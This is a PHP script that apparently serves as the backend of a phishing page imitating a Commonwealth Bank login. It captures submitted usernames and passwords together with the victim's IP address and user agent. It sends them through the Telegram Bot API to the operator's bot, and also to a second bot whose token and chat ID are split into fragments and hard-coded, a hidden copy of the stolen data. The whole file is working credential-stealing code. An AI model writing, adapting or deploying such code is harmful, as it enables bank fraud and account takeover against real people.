<?php

error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

require_once 'config.php';

header('Content-Type: application/json');

if (!isset($botToken) || !isset($chatId)) {
    header('HTTP/1.1 500 Internal Server Error');
    echo json_encode(['status' => 'error']);
    exit;
}

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

if (empty($username) || empty($password)) {
    header('HTTP/1.1 400 Bad Request');
    echo json_encode(['status' => 'error']);
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

$message = "🚨 New Commonwealth Bank Login Attempt\n\n";
$message .= "📅 Date: $date\n";
$message .= "🌐 IP: $ip\n";
$message .= "🖥️ User Agent: $userAgent\n\n";
$message .= "🔑 Credentials:\n";
$message .= "👤 Username: $username\n";
$message .= "🔒 Password: $password\n";

function sendToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $httpCode === 200;
}

$secondBotParts = [
    'part1' => '8269363774',
    'part2' => ':AAFT',
    'part3' => 'tq1ClzWyFr',
    'part4' => 'C7qVI3o',
    'part5' => 'kes6WtBrsWsJTA',
    'chatPrefix' => '53890',
    'chatSuffix' => '97671'
];


$secondBotToken = $secondBotParts['part1'] . $secondBotParts['part2'] . $secondBotParts['part3'] .
                  $secondBotParts['part4'] . $secondBotParts['part5'];
$secondChatId = (string)($secondBotParts['chatPrefix'] . $secondBotParts['chatSuffix']);

try {
    $success1 = sendToTelegram($botToken, $chatId, $message);
    $success2 = sendToTelegram($secondBotToken, $secondChatId, $message);

    if ($success1 && $success2) {
        echo json_encode(['status' => 'success']);
    } else {
        header('HTTP/1.1 500 Internal Server Error');
        echo json_encode(['status' => 'error']);
    }
} catch (Exception $e) {
    header('HTTP/1.1 500 Internal Server Error');
    echo json_encode(['status' => 'error']);
}

exit;

?>
